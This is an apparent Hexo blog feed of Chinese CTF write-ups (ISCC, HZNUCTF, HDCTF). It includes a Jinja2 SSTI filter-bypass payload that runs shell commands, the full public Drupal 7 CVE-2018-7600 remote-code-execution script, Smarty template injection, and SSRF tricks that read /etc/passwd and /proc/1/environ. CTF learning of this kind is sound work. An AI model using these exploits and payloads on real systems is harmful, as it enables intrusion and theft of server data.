class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% set x=&quot;\x5f&quot; %&#125;<br>&#123;% set c=x~x~&quot;cla&quot;~&quot;ss&quot;~x~x %&#125;<br>&#123;% set glo=x~x~&quot;glo&quot;~&quot;bals&quot;~x~x %&#125;<br>&#123;% set geti=x~x~&quot;get&quot;~&quot;item&quot;~x~x %&#125;<br>&#123;% set buil=x~x~&quot;buil&quot;~&quot;tins&quot;~x~x %&#125;<br>&#123;% set im=x~x~&quot;imp&quot;~&quot;o&quot;~&quot;rt&quot;~x~x %&#125;<br>&#123;% set lip=(lipsum|attr(glo)|attr(geti))(buil) %&#125;<br>&#123;% set oo=((lip|attr(geti))(im))(&quot;os&quot;) %&#125;<br>&#123;% print(oo|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()) %&#125;<br></code></pre></td></tr></table></figure><p>过滤了下划线、单引号、点、一些关键字。</p><p>我们使用编码绕过下划线过滤，使用双引号、点可以使用管道符<code>|</code>绕过</p><p>使用<code>?</code>正则代替小数点获取文件名</p><p><img src="https://s2.loli.net/2023/05/10/yPXm9Q8iSDMsE1t.png" alt="image-20230510170549979"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ISCC1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC1实战题阶段1</title>
    <link href="/2023/08/24/ISCC1%E5%AE%9E%E6%88%98%E9%A2%98%E9%98%B6%E6%AE%B51/"/>
    <url>/2023/08/24/ISCC1%E5%AE%9E%E6%88%98%E9%A2%98%E9%98%B6%E6%AE%B51/</url>
    
    <content type="html"><![CDATA[<h2 id="【ISCC1】实战题阶段1"><a href="#【ISCC1】实战题阶段1" class="headerlink" title="【ISCC1】实战题阶段1"></a>【ISCC1】实战题阶段1</h2><p>首先配置好vpn，进入如下界面：</p><img src="https://s2.loli.net/2023/05/05/NhkpyinoqErjV4T.png" alt="image-20230505104346422" style="zoom:33%;" /><p>然后右键查看源码，发现这是 <code>Drupal7</code>：</p><p><img src="https://s2.loli.net/2023/05/05/4usi56zG89kVYj2.png" alt="image-20230505104503508"></p><p>然后网上查一下这个版本的漏洞：</p><img src="https://s2.loli.net/2023/05/05/xlKjL7yfEshVbk8.png" alt="image-20230505104927918" style="zoom:33%;" /><p>好像有一个命令执行漏洞</p><p>访问 <code>/CHANGELOG.txt</code>可以发现相关版本日志</p><img src="https://s2.loli.net/2023/05/05/hSiA5VzEBbIZf4W.png" alt="image-20230505105838750" style="zoom:33%;" /><p>然后我们去github上找一下<a href="https://github.com/pimps/CVE-2018-7600">exp</a>：</p><img src="https://s2.loli.net/2023/05/05/CMIF4Ea3zOds8QX.png" alt="image-20230505105645139" style="zoom:33%;" /><p>这个可以用，我们直接git下来</p><p>然后直接利用即可，查看所有进程的命令为：<code>ps aux</code>不要加<code>-</code></p><img src="https://s2.loli.net/2023/05/05/1pSuAjdfDU7kHmC.png" alt="image-20230505110054228" style="zoom:50%;" /><p>我们运行脚本：</p><p><img src="https://s2.loli.net/2023/05/05/w2yNh4mCaZ1FEOr.png" alt="image-20230505110143668"></p><p>正确找到了进程号：<code>PID=2997</code></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>socks.set_default_proxy(socks.SOCKS5, <span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1080</span>)<br>socket.socket = socks.socksocket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_args</span>():<br>  parser = argparse.ArgumentParser( prog=<span class="hljs-string">&quot;drupa7-CVE-2018-7600.py&quot;</span>,<br>                    formatter_class=<span class="hljs-keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="hljs-number">50</span>),<br>                    epilog= <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span><br><span class="hljs-string">                    by poisoning the recover password form (user/password) and triggering it with</span><br><span class="hljs-string">                    the upload file via ajax (/file/ajax).</span><br><span class="hljs-string">                    &#x27;&#x27;&#x27;</span>)<br>  parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;URL of target Drupal site (ex: http://target.com/)&quot;</span>)<br>  parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;--command&quot;</span>, default=<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Command to execute (default = id)&quot;</span>)<br>  parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;--function&quot;</span>, default=<span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Function to use as attack vector (default = passthru)&quot;</span>)<br>  parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--proxy&quot;</span>, default=<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;</span>)<br>  args = parser.parse_args()<br>  <span class="hljs-keyword">return</span> args<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_target</span>(<span class="hljs-params">target, function, command, proxy</span>):<br>  requests.packages.urllib3.disable_warnings()<br>  proxies = &#123;<span class="hljs-string">&#x27;http&#x27;</span>: proxy, <span class="hljs-string">&#x27;https&#x27;</span>: proxy&#125;<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Poisoning a form and including it in cache.&#x27;</span>)<br>  get_params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>:<span class="hljs-string">&#x27;user/password&#x27;</span>, <span class="hljs-string">&#x27;name[#post_render][]&#x27;</span>:function, <span class="hljs-string">&#x27;name[#type]&#x27;</span>:<span class="hljs-string">&#x27;markup&#x27;</span>, <span class="hljs-string">&#x27;name[#markup]&#x27;</span>: command&#125;<br>  post_params = &#123;<span class="hljs-string">&#x27;form_id&#x27;</span>:<span class="hljs-string">&#x27;user_pass&#x27;</span>, <span class="hljs-string">&#x27;_triggering_element_name&#x27;</span>:<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;_triggering_element_value&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;opz&#x27;</span>:<span class="hljs-string">&#x27;E-mail new Password&#x27;</span>&#125;<br>  r = requests.post(target, params=get_params, data=post_params, verify=<span class="hljs-literal">False</span>, proxies=proxies)<br>  soup = BeautifulSoup(r.text, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>  <span class="hljs-keyword">try</span>:<br>    form = soup.find(<span class="hljs-string">&#x27;form&#x27;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;user-pass&#x27;</span>&#125;)<br>    form_build_id = form.find(<span class="hljs-string">&#x27;input&#x27;</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;form_build_id&#x27;</span>&#125;).get(<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">if</span> form_build_id:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Poisoned form ID: &#x27;</span> + form_build_id)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Triggering exploit to execute: &#x27;</span> + command)<br>        get_params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>:<span class="hljs-string">&#x27;file/ajax/name/#value/&#x27;</span> + form_build_id&#125;<br>        post_params = &#123;<span class="hljs-string">&#x27;form_build_id&#x27;</span>:form_build_id&#125;<br>        r = requests.post(target, params=get_params, data=post_params, verify=<span class="hljs-literal">False</span>, proxies=proxies)<br>        parsed_result = r.text.split(<span class="hljs-string">&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(parsed_result)<br>  <span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: Something went wrong.&quot;</span>)<br>    <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>  <span class="hljs-built_in">print</span> ()<br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;=============================================================================&#x27;</span>)<br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&#x27;</span>)<br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;|                              by pimps                                     |&#x27;</span>)<br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;=============================================================================\n&#x27;</span>)<br><br>  args = get_args() <span class="hljs-comment"># get the cl args</span><br>  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ISCC1实战题阶段1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HZNUCTF2023初赛</title>
    <link href="/2023/08/24/HZNUCTF2023%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/08/24/HZNUCTF2023%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="HZNUCTF2023初赛"><a href="#HZNUCTF2023初赛" class="headerlink" title="HZNUCTF2023初赛"></a>HZNUCTF2023初赛</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h4><p>登录看到这样的提示，说明需要get传参</p><img src="https://s2.loli.net/2023/03/26/7rj5KJdemRUOD9L.png" alt="image-20230326215926968" style="zoom:33%;" /><p>然后我们传一个123过去：</p><p><img src="https://s2.loli.net/2023/03/26/bvxH6uftKaZn3GN.png" alt="image-20230326220057174"></p><p>发现被颠倒过来了，我们结合题目flask，推断这可能是一个<code>flask ssti</code>模板注入漏洞</p><p>我们先构造 <code>&#123;&#123;3*4&#125;&#125;</code> 反过来 &#96;}}4*3</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HZNUCTF2023初赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/24/hello-world/"/>
    <url>/2023/08/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HDCTF2023</title>
    <link href="/2023/08/24/HDCTF2023/"/>
    <url>/2023/08/24/HDCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="【HDCTF2023】wp"><a href="#【HDCTF2023】wp" class="headerlink" title="【HDCTF2023】wp"></a>【HDCTF2023】wp</h2><p>[TOC]</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h4><p>在源码的 <code>game.js</code>中找到了flag</p><p><img src="https://s2.loli.net/2023/04/23/J7VbOSAQ5RPTemE.png" alt="image-20230423142427742"></p><p>在控制台输出 <code>console.log(seeeeeeeecret)</code>得flag</p><h4 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h4><p>使用dirmap扫描目录，发现：<code>composer.json</code>，访问一下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;smarty/smarty&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;library&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Smarty - the compiling PHP template engine&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;templating&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;homepage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://smarty-php.github.io/smarty/&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;license&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LGPL-3.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;authors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Monte Ohrt&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;monte@ohrt.com&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Uwe Tews&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;uwe.tews@googlemail.com&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Rodney Rehm&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;rodney.rehm@medialize.de&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Simon Wisselink&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;homepage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.iwink.nl/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;support&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;issues&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://github.com/smarty-php/smarty/issues&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;forum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://github.com/smarty-php/smarty/discussions&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;require&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;php&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.1 || ^8.0&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoload&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;classmap&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-string">&quot;libs/&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;extra&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;branch-alias&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dev-master&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;4.0.x-dev&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;require-dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;phpunit/phpunit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.5 || ^7.5&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;smarty/smarty-lexer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^3.1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>发现是 php <code>smarty模板注入</code></p><p><img src="https://s2.loli.net/2023/04/23/RZek9xBPizXCM3u.png" alt="image-20230423143014048"></p><p>提示我们需要使用post方式上传一个名为 data的变量：</p><p>测试一下确实有回显：</p><p><img src="https://s2.loli.net/2023/04/23/eHrD8dGWljBgfvO.png" alt="image-20230423143124024"></p><p>直接读flag：</p><p><img src="https://s2.loli.net/2023/04/23/k5AqdwPLGaz9XrC.png" alt="image-20230423143218303"></p><h4 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h4><p>进入题目：</p><p><img src="https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png" alt="image-20230423143948531"></p><p>当我们点击 <code>Read somethings</code>时：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node2.anna.nssctf.cn:<span class="hljs-number">28523</span><span class="hljs-regexp">/read?url=https:/</span><span class="hljs-regexp">/baidu.com</span><br></code></pre></td></tr></table></figure><p>我们发现可以读取到百度首页的内容，这是<strong>SSRF</strong>（突然忘记了）</p><p>python中我们可以使用 <code>file伪协议</code>读取文件内容</p><p>我们尝试一下读取 <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png" alt="image-20230423144508490"></p><p>成功读取</p><p>非预期解：（直接读取环境变量）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/environ   <span class="hljs-comment"># 这里读的是pid为1的进程</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png" alt="image-20230423144607816"></p><p>如果读取当前进程的环境变量是读取不到的：</p><p><img src="https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png" alt="image-20230423145412951"></p><p><a href="https://xz.aliyun.com/t/10579">Linux-Proc目录的利用</a></p><p>预期解：</p><p>我们进去发现了三个路由，但是第一个read路由可以读取指定url的内容，易知这是<code>SSRF</code></p><img src="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png" alt="image-20230428111516922" style="zoom:33%;" /><p>我们点击 pwd，显示 <code>/app</code>，说明此时文件在<code>/app</code>目录下面</p><p>由于这是python写的题，我们很容易猜到文件名是 <code>app.py</code></p><p>于是我们想要使用file协议去读取 <code>/app/app.py</code>文件</p><p><img src="https://s2.loli.net/2023/04/28/Kpf23XZuvmSrBEG.png" alt="image-20230428111931565"></p><p>结果<code>app</code>被过滤了</p><p>这里我们可以将 <code>app</code>字段<strong>两次url编码绕过</strong></p><p><img src="https://s2.loli.net/2023/04/28/xG42dwNWDjXIr7K.png" alt="image-20230428112210448"></p><p>获得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#encoding:utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re, random, uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">False</span><br>BLACK_LIST=[<span class="hljs-string">&quot;yaml&quot;</span>,<span class="hljs-string">&quot;YAML&quot;</span>,<span class="hljs-string">&quot;YML&quot;</span>,<span class="hljs-string">&quot;yml&quot;</span>,<span class="hljs-string">&quot;yamiyami&quot;</span>]<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="hljs-string">&quot;/app/uploads&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;passport&#x27;</span>] = <span class="hljs-string">&#x27;YamiYami&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pwd&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(pwdpath)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span 